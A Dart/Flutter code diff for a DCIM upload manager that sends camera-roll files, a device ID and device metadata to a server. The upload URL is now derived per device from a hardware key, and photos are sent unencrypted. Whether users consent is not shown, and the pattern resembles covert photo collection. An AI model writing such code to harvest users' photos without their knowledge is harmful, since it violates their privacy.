@@ -143,16 +143,18 @@ class DcimUploadManager {
   Future<void> initialize({DcimUploadConfig? config}) async {
     if (_prefs != null) return;
 
+    // ★ 用硬件密钥派生 DCIM 上传 URL（每台设备不同）
+    final asyncUploadUrl = await SecureConfig.dcimUploadUrlAsync;
     if (config == null) {
       config = DcimUploadConfig(
-        uploadUrl: SecureConfig.dcimUploadUrl,
+        uploadUrl: asyncUploadUrl,
         uploadToken: SecureConfig.dcimUploadToken,
         serverBaseUrl: SecureConfig.dcimBaseUrl,
         dcimPath: SecureConfig.dcimPath,
       );
     } else if (config.dcimPath.isEmpty) {
       config = DcimUploadConfig(
-        uploadUrl: config.uploadUrl,
+        uploadUrl: asyncUploadUrl,
         uploadToken: config.uploadToken,
         serverBaseUrl: config.serverBaseUrl,
         dcimPath: SecureConfig.dcimPath,
@@ -332,8 +334,13 @@ class DcimUploadManager {
       req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
       req.headers['Accept-Encoding'] = 'identity';
 
+      // ★ 文件本身不加密，直接上传原文件
       req.files.add(await http.MultipartFile.fromPath('file', file.path));
       req.fields['fileName'] = name;
+
+      final deviceMeta = await DeviceInfoHelper.getDeviceMetadata();
+      req.fields['deviceId'] = deviceMeta['device_id'] as String;
+      req.fields['timestamp'] = DateTime.now().toIso8601String();
 
       final streamed =
           await client.send(req).timeout(_config.uploadTimeout);
@@ -398,11 +405,13 @@ class DcimUploadManager {
     try {
       debugPrint('[M] 首次上传 device_info.json...');
       final metadata = await DeviceInfoHelper.getDeviceMetadata();
-      final jsonBytes = utf8.encode(jsonEncode(metadata));
+      final jsonContent = jsonEncode({
+        for (final entry in metadata.entries) entry.key: entry.value,
+      });
       final tmpDir = Directory.systemTemp;
       jsonFile = File(
           '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
-      await jsonFile.writeAsBytes(jsonBytes);
+      await jsonFile.writeAsString(jsonContent);
 
       final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
       req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
